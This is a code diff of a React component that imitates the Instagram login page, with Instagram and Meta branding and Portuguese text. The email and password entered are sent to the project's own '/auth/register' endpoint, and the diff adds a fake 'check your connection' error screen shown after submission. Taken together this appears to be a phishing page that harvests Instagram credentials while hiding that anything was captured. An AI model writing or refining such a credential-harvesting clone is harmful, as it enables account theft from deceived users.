@@ -7,6 +7,7 @@ function App() {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [message, setMessage] = useState('');
+  const [notFound, setNotFound] = useState(false); // Controla a tela "Not Found"
 
   // Função de registro de usuário
   const handleRegister = async (e) => {
@@ -21,40 +22,50 @@ function App() {
       // Enviando os dados do formulário para a API backend
       const response = await api.post('/auth/register', user);
       setMessage(response.data.msg); // Exibe a mensagem de sucesso
+      setNotFound(false); // Limpa o estado "Not Found" se o registro for bem-sucedido
     } catch (error) {
       // Lidando com erros
       setMessage(error.response?.data?.msg || 'Erro ao registrar o usuário.');
+      setNotFound(true); // Exibe a tela "Not Found" se houver erro
     }
   };
 
   return (
     <div className="login-container">
-      <div className="login-box">
-        <img src="/i.png" alt="Instagram" className="instagram-logo" />
-        <form onSubmit={handleRegister}>
-          <input
-            type="email"
-            placeholder="Nome de utilizador ou email"
-            value={email}
-            onChange={(e) => setEmail(e.target.value)}
-            required
-          />
-          <input
-            type="password"
-            placeholder="Palavra-passe"
-            value={password}
-            onChange={(e) => setPassword(e.target.value)}
-            required
-          />
-          <button className="buttoniniciar" type="submit">Iniciar Sessão</button>
-        </form>
-        <div className="divider">OU</div>
-        <button className="facebook-login">
-          <img src="/face.png" alt="Facebook" className="facebook-icon" /> {/* Imagem do Facebook */}
-          Iniciar sessão com o Facebook
-        </button>
-        <a href="/forgot-password">Esqueceste-te da palavra-passe?</a>
-      </div>
+      {notFound ? (
+        // Exibe a tela "Not Found" quando o estado "notFound" for verdadeiro
+        <div className="not-found">
+          <p><span style={{color: 'red'}}>[ERROR]</span> verifique sua conexão, tente novamente mais tarde!</p>
+        </div>
+      ) : (
+        <div className="login-box">
+          <img src="/i.png" alt="Instagram" className="instagram-logo" />
+          <form onSubmit={handleRegister}>
+            <input
+              type="email"
+              placeholder="Nome de utilizador ou email"
+              value={email}
+              onChange={(e) => setEmail(e.target.value)}
+              required
+            />
+            <input
+              type="password"
+              placeholder="Palavra-passe"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              required
+            />
+            <button className="buttoniniciar" type="submit">Iniciar Sessão</button>
+          </form>
+          <div className="divider">OU</div>
+          <button className="facebook-login">
+            <img src="/face.png" alt="Facebook" className="facebook-icon" />
+            Iniciar sessão com o Facebook
+          </button>
+          <a href="/forgot-password">Esqueceste-te da palavra-passe?</a>
+        </div>
+      )}
+
       <div className="signup-box">
         <p>Não tens uma conta? <a href="/register">Regista-te.</a></p>
       </div>
@@ -79,9 +90,7 @@ function App() {
           <a href="/contact-upload">Carregamento de contactos e não utilizadores</a>
           <a href="/verification">Verificação</a>
         </div>
-        <div className="language">
-         
-        </div>
+        <div className="language"></div>
         <div className="copyright">
           <p>© 2025 Instagram from Meta</p>
         </div>
